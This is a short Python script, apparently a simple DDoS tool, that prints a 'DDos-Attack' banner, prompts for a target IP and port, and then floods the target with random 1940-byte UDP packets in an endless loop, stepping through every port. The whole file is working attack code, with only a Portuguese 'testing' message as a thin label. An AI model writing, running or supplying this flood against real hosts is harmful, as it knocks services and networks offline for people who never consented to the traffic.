def funcao_padrao():
    import socket
    import os
    import random

    from datetime import datetime
    now = datetime.now()
    hour = now.hour
    minute = now.minute
    day = now.day
    month = now.month
    year = now.year

    ss = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1940)
    os.system("figlet DDos-Attack")

    a = input("Ip: ")
    b = input("Port: ")

    send = 0
    while True:
        send = send + 1
        b = int(b) + 1
        ss.sendto(bytes,  (a, b))
        print(f"Testando {send} alvo {a} na porta {b}")
        if b == 65534:
            b = 1